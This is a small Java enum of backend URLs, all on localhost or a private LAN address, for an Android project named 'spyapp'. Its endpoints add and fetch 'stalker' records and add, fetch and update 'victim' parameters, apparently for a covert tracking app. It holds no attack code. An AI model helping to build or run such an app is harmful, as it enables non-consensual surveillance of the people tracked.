package com.example.albert.spyapp;

enum Urls {
    TEST("http://192.168.0.37:4567/test"),
    ADDSTALKER("http://localhost:4567//stalker/addStalker"),
    GETSTALKER("http://localhost:4567//stalker/getStalker/"),
    UPDATEVICTIMPARAMS("http://localhost:4567/victim/updatesParams/:id"),
    ADDVIVTIM("http://localhost:4567/victim/addVictim"),
    GETVICTIM("http://localhost:4567/victim/getVictim/:id/:name");

    String url;
    Urls(String address) {
        url=address;
    }

}